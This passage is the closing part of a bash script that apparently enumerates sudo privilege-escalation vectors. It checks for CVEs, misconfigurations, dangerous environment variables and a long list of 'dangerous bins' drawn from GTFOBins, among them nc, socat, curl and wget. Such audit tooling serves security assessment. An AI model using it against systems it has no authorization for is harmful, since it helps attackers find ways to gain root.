#fn_dngbin "ash" "/usr/bin/" "[=] sudo ash" 

echo -e "[-] dangerous bins (https://gtfobins.github.io/#+sudo): "

fn_dngbin2 "apt"
fn_dngbin2 "apt-get"
fn_dngbin2 "aria2c"
fn_dngbin2 "ash"
fn_dngbin2 "awk"
fn_dngbin2 "base64"
fn_dngbin2 "bash"
fn_dngbin2 "busybox"
fn_dngbin2 "cat"
fn_dngbin2 "chmod"
fn_dngbin2 "chown"
fn_dngbin2 "cp"
fn_dngbin2 "cpulimit"
fn_dngbin2 "crontab"
fn_dngbin2 "csh"
fn_dngbin2 "curl"
fn_dngbin2 "cut"
fn_dngbin2 "dash"
fn_dngbin2 "date"
fn_dngbin2 "dd"
fn_dngbin2 "diff"
fn_dngbin2 "docker"
fn_dngbin2 "ed"
fn_dngbin2 "emacs"
fn_dngbin2 "env"
fn_dngbin2 "expand"
fn_dngbin2 "expect"
fn_dngbin2 "facter"
fn_dngbin2 "find"
fn_dngbin2 "finger"
fn_dngbin2 "flock"
fn_dngbin2 "fmt"
fn_dngbin2 "fold"
fn_dngbin2 "ftp"
fn_dngbin2 "gdb"
fn_dngbin2 "git"
fn_dngbin2 "head"
fn_dngbin2 "ionice"
fn_dngbin2 "jq"
fn_dngbin2 "ksh"
fn_dngbin2 "ld.so"
fn_dngbin2 "less"
fn_dngbin2 "ltrace"
fn_dngbin2 "lua"
fn_dngbin2 "mail"
fn_dngbin2 "make"
fn_dngbin2 "man"
fn_dngbin2 "more"
fn_dngbin2 "mount"
fn_dngbin2 "mv"
fn_dngbin2 "mysql"
fn_dngbin2 "nano"
fn_dngbin2 "nc"
fn_dngbin2 "nice"
fn_dngbin2 "nl"
fn_dngbin2 "nmap"
fn_dngbin2 "node"
fn_dngbin2 "od"
fn_dngbin2 "perl"
fn_dngbin2 "pg"
fn_dngbin2 "php"
fn_dngbin2 "pico"
fn_dngbin2 "pip"
fn_dngbin2 "puppet"
fn_dngbin2 "python2"
fn_dngbin2 "python3"
fn_dngbin2 "red"
fn_dngbin2 "rlwrap"
fn_dngbin2 "rpm"
fn_dngbin2 "rpmquery"
fn_dngbin2 "rsync"
fn_dngbin2 "ruby"
fn_dngbin2 "scp"
fn_dngbin2 "sed"
fn_dngbin2 "setarch"
fn_dngbin2 "sftp"
fn_dngbin2 "shuf"
fn_dngbin2 "smbclient"
fn_dngbin2 "socat"
fn_dngbin2 "sort"
fn_dngbin2 "sqlite3"
fn_dngbin2 "ssh"
fn_dngbin2 "stdbuf"
fn_dngbin2 "strace"
fn_dngbin2 "tail"
fn_dngbin2 "tar"
fn_dngbin2 "taskset"
fn_dngbin2 "tclsh"
fn_dngbin2 "tcpdump"
fn_dngbin2 "tee"
fn_dngbin2 "telnet"
fn_dngbin2 "tftp"
fn_dngbin2 "time"
fn_dngbin2 "timeout"
fn_dngbin2 "ul"
fn_dngbin2 "unexpand"
fn_dngbin2 "uniq"
fn_dngbin2 "unshare"
fn_dngbin2 "vi"
fn_dngbin2 "vim"
fn_dngbin2 "watch"
fn_dngbin2 "wget"
fn_dngbin2 "whois"
fn_dngbin2 "wish"
fn_dngbin2 "xargs"
fn_dngbin2 "xxd"
fn_dngbin2 "zip"
fn_dngbin2 "zsh"

}

while getopts "h:k:r:e:s:t:c" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    c) sudocve=1;;
  #  t) thorough=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

call_each()
{
  header
 # usage
  intro
  checkinitial
  checkcve
  checkmisconfig
  checkdangenvar
  checkdangbin
  footer
}

call_each | tee -a $report 2> /dev/null
